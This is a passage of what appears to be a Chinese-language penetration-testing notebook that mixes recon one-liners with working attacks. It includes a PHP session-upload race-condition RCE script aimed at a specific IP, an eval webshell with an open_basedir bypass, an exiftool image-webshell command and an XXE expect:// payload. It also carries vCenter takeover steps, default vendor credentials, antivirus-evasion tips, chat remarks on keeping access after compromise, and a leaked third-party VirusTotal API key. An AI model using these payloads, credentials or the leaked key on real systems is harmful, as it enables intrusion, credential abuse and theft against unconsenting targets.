class="hljs-string">&quot;.HOST&quot;</span> | <span class="hljs-built_in">sort</span> -u ; <span class="hljs-keyword">done</span> &lt; FILE.txt<br><br>FFUF 的子域暴力破解器 @GochaOqradze <br>ffuf -u https://FUZZ.HOST -w FILE.txt -v | grep <span class="hljs-string">&quot;| URL |&quot;</span> | awk <span class="hljs-string">&#x27;&#123;print $4&#125;&#x27;</span><br><br>从 IP 地址查找 ASN 的分配 IP 范围 wains.be <br>whois -h whois.radb.net -i origin -T route $(whois -h whois.radb.net IP | grep origin: | awk <span class="hljs-string">&#x27;&#123;print $NF&#125;&#x27;</span> | <span class="hljs-built_in">head</span> -1) | grep -w <span class="hljs-string">&quot;route:&quot;</span> | awk <span class="hljs-string">&#x27;&#123;print $NF&#125;&#x27;</span> | <span class="hljs-built_in">sort</span> -n<br><br>从文件中提取 IP @emenalf <br>grep -E -o <span class="hljs-string">&#x27;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)&#x27;</span> file.txt<br><br>查找子域接管 <br>subfinder -d HOST &gt;&gt; FILE; assetfinder --subs-only HOST &gt;&gt; FILE; amass enum -norecursive -noalts -d HOST &gt;&gt; FILE; subjack -w FILE -t 100 -<span class="hljs-built_in">timeout</span> 30 -ssl -c <span class="hljs-variable">$GOPATH</span>/src/github.com/haccer/subjack/fingerprints.json -v 3 &gt;&gt; takeover ;<br><br>使用 cURL + Parallel 进行 URL 探测 <br><span class="hljs-built_in">cat</span> HOSTS.txt | parallel -j50 -q curl -w <span class="hljs-string">&#x27;Status:%&#123;http_code&#125;\t  Size:%&#123;size_download&#125;\t %&#123;url_effective&#125;\n&#x27;</span> -o /dev/null -skw<br><br>我个人觉得很有用的来了，注意哈。上面并不全，全的在原文，我翻译过来后，筛出来适合咱用的一些命令：<br><br>转储范围内的资产 chaos-bugbounty-list@dwisiswant0 <br>curl -sL https://github.com/projectdiscovery/public-bugbounty-programs/raw/master/chaos-bugbounty-list.json | jq -r <span class="hljs-string">&#x27;.programs[].domains | to_entries | .[].value&#x27;</span><br><br><br>转储范围内的资产 bounty-targets-data<br>HackerOne 程序 <br>curl -sL https://github.com/arkadiyt/bounty-targets-data/blob/master/data/hackerone_data.json?raw=<span class="hljs-literal">true</span> | jq -r <span class="hljs-string">&#x27;.[].targets.in_scope[] | [.asset_identifier, .asset_type] | @tsv&#x27;</span><br><br><br>BugCrowd 程序 <br>curl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/bugcrowd_data.json | jq -r <span class="hljs-string">&#x27;.[].targets.in_scope[] | [.target, .type] | @tsv&#x27;</span><br><br>还有一些，在原文，hackerone的资产是每小时更新的可以进行差异化对比来获取到新的项目资产范围<br><br>从swagger.json提取端点 @zer0pwn  最常用的语句了<br>curl -s https://HOST/v2/swagger.json | jq <span class="hljs-string">&#x27;.paths | keys[]&#x27;</span><br><br><br>查找隐藏的服务器和/或管理面板  这个依托与字典了<br>ffuf -c -u URL -H <span class="hljs-string">&quot;Host: FUZZ&quot;</span> -w FILE.txt<br></code></pre></td></tr></table></figure>

<p>在你们用这些工具的时候最好开一台服务器来配置你们的工具环境变量，我用的centos缺什么从yum拉取或者你已经配置好了工具保证你的命令能够调用的到比如前面的subfinder，ffuf 不然的话会报错的，其余的命令看原文吧，重复利用的比较少</p>
<p>描述一下TCP拥塞控制的慢开始和拥塞避免<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205051153095.png" srcset="/img/loading.gif" lazyload alt="image-20220505115333924"></p>
<p> 看到这里的时候，特别是<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=session&spm=1001.2101.3001.7020">session</a>.upload.progress.enable这个开启时，就想到了当传入文件上去时，有办法可以进行rce。刚开始时想用条件竞争，直接就用脚本读出来了。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> io<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> threading<br>host = <span class="hljs-string">&#x27;http://114.115.134.72:32770/index.php&#x27;</span><br>sessid = <span class="hljs-string">&#x27;aa&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">POST</span>(<span class="hljs-params">session</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        f = io.BytesIO(<span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">50</span>)<br>        session.post(<br>            host,<br>            data=&#123;<span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>:<span class="hljs-string">&quot;&lt;?php system(&#x27;ls /&#x27;);echo md5(&#x27;1&#x27;);?&gt;&quot;</span>&#125;,<br>            files=&#123;<span class="hljs-string">&quot;file&quot;</span>:(<span class="hljs-string">&#x27;a.txt&#x27;</span>, f)&#125;,<br>            cookies=&#123;<span class="hljs-string">&#x27;PHPSESSID&#x27;</span>:sessid&#125;,<br>        )<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">READ</span>(<span class="hljs-params">session</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        response = session.get(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;host&#125;</span>?file=/tmp/sess_<span class="hljs-subst">&#123;sessid&#125;</span>&#x27;</span>)<br>        <span class="hljs-comment"># print(response.text)</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;c4ca4238a0b923820dcc509a6f75849b&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> response.text:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+++]retry&#x27;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(response.text)<br>            <span class="hljs-keyword">break</span><br> <br><span class="hljs-keyword">with</span> requests.session() <span class="hljs-keyword">as</span> session:<br>    t1 = threading.Thread(target=POST, args=(session, ))<br>    t1.daemon = <span class="hljs-literal">True</span><br>    t1.start()<br>    READ(session)<br></code></pre></td></tr></table></figure>



<p>线程和进程有什么区别:</p>
<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mathematica">资源：进程是资源分配的基本单位，但线程不拥有资源，线程能访问其所属进程的资源；<br>调度：线程是独立调度的基本单位，同一进程中线程的切换不会引起进程的切换，而不同进程间线程的切换会引起进程的切换；<br>系统开销：进程的新建和撤销时，系统需要为其分配和回收资源，如内存空间和<span class="hljs-built_in">I</span><span class="hljs-operator">/</span><span class="hljs-built_in">O</span>设备等，开销远大于线程的新建和撤销。进程的切换需要当前进程<span class="hljs-variable">CPU</span>环境的保护和新进程环境的设置，而线程的切换只需要保存和设置少量的寄存器内容，开销很小。因此，线程的系统开销远低于进程。<br>通信：线程可以直接读写进程数据进行通信，但进程需要<span class="hljs-variable">IPC</span>（进程间通信技术）进行通信<span class="hljs-punctuation">(</span>管道、消息队列、共享内存<span class="hljs-punctuation">)</span>。<br></code></pre></td></tr></table></figure>



<p>木马驻留系统的方式有哪些？</p>
<figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-number">1</span>.利用操作系统的管理机制：比如写个服务，建立计划任务，将程序写入自启动目录，注册表驻留<br><span class="hljs-number">2</span>.利用操作系统的程序执行机制：比如dll劫持，<span class="hljs-built_in">path</span>劫持（<span class="hljs-built_in">shift</span>后门）<br><span class="hljs-number">3</span>.利用诱导触发的方式：比如宏病毒，快捷方式忽悠<br><span class="hljs-number">4</span>.想办法搞个帐号<br><span class="hljs-number">5</span>.利用第三方程序的漏洞：比如webshell，sql注入<br><span class="hljs-number">6</span>.第三方程序投毒<br></code></pre></td></tr></table></figure>



<p>SQLmap参数–os-shell的本质</p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ada">那么<span class="hljs-comment">--os-shell的本质就是利用不同数据库的特性，在当前数据库用户权限足够的情况下利用其特性执行命令。</span><br>MySQL：有权限的情况下且得到物理路径可写恶意代码到目标，并利用脚本代码的函数执行系统命令。<br>mssql ：这个微软的数据库就是利用存储过程执行命令<br></code></pre></td></tr></table></figure>



<p>for &#x2F;L %P in (1,1,254) do @ping -w 10 -n 1 10.128.12.%P | findstr TTL</p>
<p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205142248705.png" srcset="/img/loading.gif" lazyload alt="image-20220514224856626"></p>
<p>八字节表示常用数字<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205151930560.png" srcset="/img/loading.gif" lazyload alt="image-20220515193017495" style="zoom:150%;" /></p>
<ul>
<li><p>juniper 登录地址:<a target="_blank" rel="noopener" href="https://192.168.1.1/">https://192.168.1.1</a> 用户名:netscreen 密码:netscreen</p>
<p>Cisco 登录地址:<a target="_blank" rel="noopener" href="https://192.168.0.1/">https://192.168.0.1</a> 用户名:admin 密码:cisco</p>
<p>Huawei 登录地址:<a target="_blank" rel="noopener" href="http://192.168.0.1/">http://192.168.0.1</a> 用户名:admin 密码:Admin@123</p>
<p>深信服 VPN：51111 端口 delanrecover</p>
<p>华为 VPN：账号：root 密码：mduadmin</p>
<p>华为防火墙：admin Admin@123 eudemon</p>
</li>
</ul>
<p>找到管理员登录口，可以尝试以下账号密码<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205151942329.png" srcset="/img/loading.gif" lazyload alt="image-20220515194248253"></p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs awk">fiveandtwo=]<span class="hljs-number">0</span> <span class="hljs-number">2022</span><span class="hljs-regexp">/5/</span><span class="hljs-number">13</span> <span class="hljs-number">16</span>:<span class="hljs-number">52</span>:<span class="hljs-number">53</span><br>学姐他们上线后很快就被断了<br><br>fiveandtwo=]<span class="hljs-number">0</span> <span class="hljs-number">2022</span><span class="hljs-regexp">/5/</span><span class="hljs-number">13</span> <span class="hljs-number">16</span>:<span class="hljs-number">53</span>:<span class="hljs-number">03</span><br>检测力太强了<br><br>fiveandtwo=]<span class="hljs-number">0</span> <span class="hljs-number">2022</span><span class="hljs-regexp">/5/</span><span class="hljs-number">13</span> <span class="hljs-number">16</span>:<span class="hljs-number">53</span>:<span class="hljs-number">10</span><br>权限维持还是很重要的<br><br>fiveandtwo=]<span class="hljs-number">0</span> <span class="hljs-number">2022</span><span class="hljs-regexp">/5/</span><span class="hljs-number">13</span> <span class="hljs-number">19</span>:<span class="hljs-number">57</span>:<span class="hljs-number">04</span><br>万欣数据库默认密码<br><br>你撤回了一条消息，因为有错别字。<br><br>fiveandtwo=]<span class="hljs-number">0</span> <span class="hljs-number">2022</span><span class="hljs-regexp">/5/</span><span class="hljs-number">13</span> <span class="hljs-number">19</span>:<span class="hljs-number">57</span>:<span class="hljs-number">52</span><br>连接后改数据库账号的密码<br><br>fiveandtwo=]<span class="hljs-number">0</span> <span class="hljs-number">2022</span><span class="hljs-regexp">/5/</span><span class="hljs-number">13</span> <span class="hljs-number">19</span>:<span class="hljs-number">57</span>:<span class="hljs-number">58</span><br>先找教工信息<br><br>fiveandtwo=]<span class="hljs-number">0</span> <span class="hljs-number">2022</span><span class="hljs-regexp">/5/</span><span class="hljs-number">13</span> <span class="hljs-number">19</span>:<span class="hljs-number">58</span>:<span class="hljs-number">08</span><br>教工权限比较大一点<br><br>fiveandtwo=]<span class="hljs-number">0</span> <span class="hljs-number">2022</span><span class="hljs-regexp">/5/</span><span class="hljs-number">13</span> <span class="hljs-number">20</span>:<span class="hljs-number">02</span>:<span class="hljs-number">03</span><br>拿到账号后一定要先找其他的账号<br><br>fiveandtwo=]<span class="hljs-number">0</span> <span class="hljs-number">2022</span><span class="hljs-regexp">/5/</span><span class="hljs-number">13</span> <span class="hljs-number">20</span>:<span class="hljs-number">15</span>:<span class="hljs-number">36</span><br>后渗透先搞<span class="hljs-number">80</span>端口 搞完成功后再找其他端口 这样比较快一点<br><br>fiveandtwo=]<span class="hljs-number">0</span> <span class="hljs-number">2022</span><span class="hljs-regexp">/5/</span><span class="hljs-number">13</span> <span class="hljs-number">20</span>:<span class="hljs-number">17</span>:<span class="hljs-number">53</span><br>御剑端口扫描工具<br><br><br></code></pre></td></tr></table></figure>



<p>找工具的话要找那些开发平台兼容大的工具 </p>
<p>然后我就想着提权不了，也看不了上级的目录，那要怎么拿目标站？辛亏我师傅说可以用.user.ini和php文件来绕过目录的限制！！</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//.user.ini</span><br>open_basedir=:/<br><span class="hljs-comment">//user.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_post</span>[<span class="hljs-string">&quot;pass&quot;</span>])<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205202141969.png" srcset="/img/loading.gif" lazyload alt="图片"></p>
<p>通过突破目录的限制，连上了新的shell后发现能看到全部的目录了</p>
<p><strong>重点是：</strong>本地解码编码操作不会触发杀软拦截行为！</p>
<p>用的菜刀，传了一个exe上去，要cd到exe的目录，但是目录有中文啊，我cd不过去啊，我想了很久不知道怎么解决，后来在吐司的论坛上看见，可以写入bat</p>
<p>先看看内网环境大概是什么情况</p>
<p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205251110342.jpeg" srcset="/img/loading.gif" lazyload alt="图片">遇到这种的，基本都是vCenter环境了 poc打入后</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">这里有个很坑的点，就是部分POC有linux模式和windows模式两种。而他们的逻辑有点问题，先用linux下的payload去打这个windows机器，但是不知道为什么，POC判断攻击成功了，于是就没有启用windows模式的payload。这就导致一开始我们迟迟写不上马。解决方案也很简单，直接删掉linux模式的payload，强制程序用windows模式来打。<br></code></pre></td></tr></table></figure>

<p>直接往这里面传马即可：</p>
<figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-name">C</span>:\ProgramData\VMware\vCenterServer\data\perfcharts\tc-instance\webapps\statsreport\<br></code></pre></td></tr></table></figure>

<p>接下来就是一气呵成了，大文件下载data.mdb,使用工具伪造COOKIE，然后登陆vSphere Client即可接管这个内网环境。</p>
<p>然后用这个脚本直接攻击即可：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/horizon3ai/</span>vcenter_saml_login<span class="hljs-regexp">/blob/m</span>ain/vcenter_saml_login.py<br><span class="hljs-regexp">/使用脚本时可能会报错，需要提前安装requirements.txt下的库/</span><br><span class="hljs-regexp">/pip install python_ldap-3.4.0-cp310-cp310-win_amd64.whl/</span><br>想使用这个脚本，必须要可达vSphere Client，也就是说用它之前得先把socks代理搞好，搞好之后就可以愉快的食用这个脚本了<br>使用方法为：<br>python vcenter_saml_login.py -t &lt;目标机器内网ip&gt; -p data.mdb<br></code></pre></td></tr></table></figure>

<p>更多参考链接:<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzU3MTU3NTY2NA==&mid=2247485272&idx=1&sn=7db93fcc3013033566de9448e1dd9de4&chksm=fcdf5b47cba8d251087e893bfda200779502cdba40f8336a17d36972e0f1f5cd0e98ac50293a&scene=21#wechat_redirect">https://mp.weixin.qq.com/s?__biz=MzU3MTU3NTY2NA==&amp;mid=2247485272&amp;idx=1&amp;sn=7db93fcc3013033566de9448e1dd9de4&amp;chksm=fcdf5b47cba8d251087e893bfda200779502cdba40f8336a17d36972e0f1f5cd0e98ac50293a&amp;scene=21#wechat_redirect</a></p>
<p>虽然被黑的很惨，这里还是更正一下，除了 ch1ng 师傅在 <a target="_blank" rel="noopener" href="https://www.ch1ng.com/blog/264.html">https://www.ch1ng.com/blog/264.html</a> 提到的 Tomcat 处理会忽略 \ 的情况，刚才园长提到的是 org.apache.tomcat.util.http.parser.HttpParser#unquote 方法会处理文件名中的 “，方法是见到双引号后直接字符串长度 -1<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205271632760.png" srcset="/img/loading.gif" lazyload alt="image-20220527163259558"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205271633349.png" srcset="/img/loading.gif" lazyload alt="image-20220527163313249"></p>
<p>配合 \ 的忽略可以搞出比较恶心的文件名</p>
<p>vpn设备集合：路由功能、流量审计、防火墙、vpn</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">ftp加! 可以执行命令<br></code></pre></td></tr></table></figure>

<p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202206012249266.jpeg" srcset="/img/loading.gif" lazyload alt="图片">！！！可恶啊我现在才知道 hw都结束了</p>
<p>vps提供下载的话 还是用apache好 别开python http 网站访问没问题</p>
<p>但是curl等命令行下载不容易成功</p>
<p>Kili工具:<strong>使用exiftool -Comment&#x3D;’<?php system($_REQUEST['cmd']); ?>‘ 1.png 生成一个图片马，图片在网上下一个.png格式的。</strong></p>
<p><strong>直接上传.png格式是无法上传成功的，将其改成1.php.png格式。再次进行上传。</strong></p>
<p>VCenter获得锁屏机器Hash之KonBoot引导：</p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzI2NDQyNzg1OA==&mid=2247490788&idx=1&sn=0bf64b4ad055e08984ed52f726e617aa&chksm=eaad9cd9ddda15cf53fd72a7950b2004900a7d37c3c3eb870bc3e7974a18174d05dccef3d316&mpshare=1&scene=23&srcid=0616IuAwJhpU2vlrufTdIiDW&sharer_sharetime=1655394036259&sharer_shareid=9108c08c45d1f36cab8f5c866e004fa3#rd">https://mp.weixin.qq.com/s?__biz=MzI2NDQyNzg1OA==&amp;mid=2247490788&amp;idx=1&amp;sn=0bf64b4ad055e08984ed52f726e617aa&amp;chksm=eaad9cd9ddda15cf53fd72a7950b2004900a7d37c3c3eb870bc3e7974a18174d05dccef3d316&amp;mpshare=1&amp;scene=23&amp;srcid=0616IuAwJhpU2vlrufTdIiDW&amp;sharer_sharetime=1655394036259&amp;sharer_shareid=9108c08c45d1f36cab8f5c866e004fa3#rd</a></p>
<p>可以用john爆破压缩包密码</p>
<p>pfx是个经过数字签名加密的证书文件</p>
<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">文件的扩展名PFX的系统文件，以嵌入到它的加密安全功能特别文件。这些的加密安全功能的<span class="hljs-string">.pfx</span>文件包括用来参与确定身份验证过程数字证书的用户或设备都可以访问某些文件，系统本身或者计算机连接的是那些具有管理员权限的网络是否。这些PFX文件需要密码就可以使用Adobe Acrobat X或Adobe Reader中打开之前。这意味着这些PFX文件是保护或保护用户免受黑客，第三方用户的计算机和网络，而无需访问系统和网络资源的同意有益的以及恶意应用程序，指示它来访问这些受保护的资源和数据的代码。PFX文件可能在Mac和Microsoft Windows系统中找到，并且可用于打开这些应用程序的<span class="hljs-string">.pfx</span>文件是使用Adobe Acrobat X和Adobe Reader与Mac或Microsoft Windows环境兼容的版本。<br></code></pre></td></tr></table></figure>

<p>同样可以用jhon爆破</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">john --wordlist=<span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>rockyou.txt pfxhash<br></code></pre></td></tr></table></figure>

<p>然后使用<code>openssl</code>和pkcs12，将key导出。</p>
<figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas">openssl pkcs12 -<span class="hljs-keyword">in</span> legacyy_dev_auth.pfx -nocerts -<span class="hljs-keyword">out</span> pfx.<span class="hljs-keyword">key</span><br></code></pre></td></tr></table></figure>

<p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202206171428502.png" srcset="/img/loading.gif" lazyload alt="图片">密码都是一样，上面爆破出来那个</p>
<p>之后还必须要生成一个证书才能登录</p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">openssl pkcs12 -<span class="hljs-keyword">in</span> legacyy_dev_auth.pfx -clcerts -nokeys -<span class="hljs-keyword">out</span> pfx.crt<br></code></pre></td></tr></table></figure>

<p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202206171428300.png" srcset="/img/loading.gif" lazyload alt="图片">密码都一样</p>
<p>前面信息收集说到发现有winrm，端口5986</p>
<p>使用<code>evil-winrm</code>工具进行连接</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">evil-winrm -<span class="hljs-selector-tag">i</span> ip -S -c pfx<span class="hljs-selector-class">.crt</span> -k pfx<span class="hljs-selector-class">.key</span> -<span class="hljs-selector-tag">p</span> -u<br></code></pre></td></tr></table></figure>

<p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202206171429692.png" srcset="/img/loading.gif" lazyload alt="图片">输入我们刚刚的密码</p>
<p>就能登录</p>
<p>JNI (<code>Java Native Interface</code>，JAVA 本地接口) 允许 Java 代码和其它编程语言编写的代码进行交互，主要为Java和Native层（C&#x2F;C++）相互调用的接口规范，但是并不妨碍扩展其他语言。 JNI 在 Java1.1 中正式推出，在 Java1.2 中加入了<code>JNI_OnLoad</code>和<code>JNI_OnUnload</code>方法。</p>
<p>Weblogic写shell的路径大概如下&#x2F;u01&#x2F;domains&#x2F;osb&#x2F;servers&#x2F;AdminServer&#x2F;tmp&#x2F;_WL_internal&#x2F;uddiexplorer&#x2F;随机字符&#x2F;war&#x2F;shell.jsp</p>
<p>hash传递rap 使用win10登录出现身份验证错误 要求的函数不受支持 “这可能是由于CredSSP加密数据库修正” 解决链接:<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247506207&idx=1&sn=e15fa2431e43dd964c2bc516e7b3cb64&chksm=ec1c8c20db6b05363307efcc0130476a8fcde3715beee218252c549e6e55ecb5a7626002c459&mpshare=1&scene=23&srcid=062417jP0IV782r2EUewn3Xu&sharer_sharetime=1656049936513&sharer_shareid=ee83a55e0b955b99e8343acbb61916b7#rd">实战 | 记一次简单的国外站点小练手 (qq.com)</a></p>
<p>使用DNSURL来探测其他利用链</p>
<p>对于shiro，使用成熟的exp工具来自动回显利用的情况已经越来越少。大部分情况下，即使找到key也无法找到合适的利用方式和正确的利用版本（工具生成序列化字符串时使用的依赖版本与服务器上运行的依赖版本不符就会产生报错，无法反序列化）。</p>
<p>但是由于DNSURL链是基于jar包且不受版本影响的，所以遇到shiro的出网的站时，可以用这个工具（<a target="_blank" rel="noopener" href="https://github.com/kezibei/Urldns%EF%BC%89%E7%94%9F%E6%88%90%E5%88%A9%E7%94%A8%E9%93%BE%E6%8E%A2%E6%B5%8Bpayload%EF%BC%8C%E5%AE%9E%E6%93%8D%E5%A6%82%E4%B8%8B%EF%BC%9A">https://github.com/kezibei/Urldns）生成利用链探测payload，实操如下：</a></p>
<p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202206251213913.png" srcset="/img/loading.gif" lazyload alt="图片">注意此时生成的是base64编码的值，shiro验证和利用还需要自己写脚本进行aes或者gcm的加密。使用Burp输入cookie字段发包后可以得知为Windows服务器，存在c3p0-92版本和cc31版本依赖（但不是一定就可以利用)。<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/TSD_bcL5JBMJQBotCHqTyw">https://mp.weixin.qq.com/s/TSD_bcL5JBMJQBotCHqTyw</a></p>
<p>把请求包详情展示，包括发送包，因为有时候复现不出来，大概率是和请求头某些参数有关系。</p>
<p>xml传输的标志<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202207061204449.png" srcset="/img/loading.gif" lazyload alt="image-20220706120455116"></p>
<p>容易造成xxe攻击，且一般情况下，只能造成任意文件读取。除非对方开启了expct：&#x2F;&#x2F;-处理交互式的流。当然这个封装协议默认是不开启的。就能造成rce</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;expect://id&quot;</span> &gt;</span>]&gt;<br></code></pre></td></tr></table></figure>



<p>单向流就是我发给你，然后要看到你接收</p>
<p>双向流就是在单向流的基础上你一条我一条来回</p>
<p>隧道就是互发信息直到读取不出来</p>
<p>客户端就是我(客户端)发给你就行。你之后再看到也没关系</p>
<p>声东击西:在进行内网横向的时候 我们可以布置多台机器去对外部资产或者必须要运行的资产进行疯狂扫描骚扰。导致运维(蓝队)烦不胜烦,进而掩盖我们的真正攻击</p>
<p>msf植入jdk包钓鱼</p>
<p>McAfee检测到压缩包病毒直接删 根本不给你机会看到</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">注意是只删里面的特定文件<br></code></pre></td></tr></table></figure>



<p>火绒一般只查杀C:&#x2F;system&#x2F;里面的文件 把它复制到其它地方就行</p>
<p>20220811</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">Virustotal的key 用来下载他们的文件<br><br>上干货——Enigmasoftware api key：<br>d10468bead05da1685629a0abcfed5f963d6adbc7e6bb2b2fc343dbb36be0349<br><br><br>下载文件（比如下载哈希为fc6c880e33a73faf58a30f862d18dcc2的文件）<br>https://www.virustotal.com/intelligence/download/?apikey=d10468bead05da1685629a0abcfed5f963d6adbc7e6bb2b2fc343dbb36be0349&amp;<span class="hljs-built_in">hash</span>=fc6c880e33a73faf58a30f862d18dcc2<br>高级查询<br>curl --request GET --url <span class="hljs-string">&quot;https://www.virustotal.com/api/v3/intelligence/search?query=&#123;name:thor64&#125;&quot;</span> --header <span class="hljs-string">&quot;x-apikey:d10468bead05da1685629a0abcfed5f963d6adbc7e6bb2b2fc343dbb36be0349&quot;</span><br>其他的API使用手册地址：<br>https://developers.virustotal.com/reference/overview<br></code></pre></td></tr></table></figure>



<p>sql中根据系统视图联合查询包含phone字段的列名、数据量大于阈值、表名、schema、数据库名，并按数据量排序。</p>
<p>mssql</p>
